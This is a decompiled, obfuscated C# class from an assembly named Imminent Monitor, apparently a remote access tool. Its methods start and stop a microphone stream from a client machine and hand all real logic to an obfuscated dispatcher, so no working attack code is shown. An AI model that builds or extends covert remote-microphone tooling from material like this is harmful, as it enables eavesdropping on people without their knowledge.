// Decompiled with JetBrains decompiler
// Type: ImminentMonitor.Cef.MicCefHandler
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

namespace ImminentMonitor.Cef
{
  public class MicCefHandler
  {
    public FormMicrophone MicrophoneForm;

    public MicCefHandler(FormMicrophone microphoneForm) => this.MicrophoneForm = microphoneForm;

    public void updateTitle()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), "a$,ZMPa.Q$", object_3);
    }

    public void stopStream()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), "pF)2gPa.Q$", object_3);
    }

    public void startStream(int clientInputIndex, int clientOutputIndex, int myOutputIndex)
    {
      object[] object_3 = new object[4]
      {
        (object) this,
        (object) clientInputIndex,
        (object) clientOutputIndex,
        (object) myOutputIndex
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "oZND]Pa.Q$", object_3);
    }

    public void enableMyMicrophoneChanged(bool enabled, int myAudioInputDeviceIndex)
    {
      object[] object_3 = new object[3]
      {
        (object) this,
        (object) enabled,
        (object) myAudioInputDeviceIndex
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "MY*'qPa.Q$", object_3);
    }
  }
}
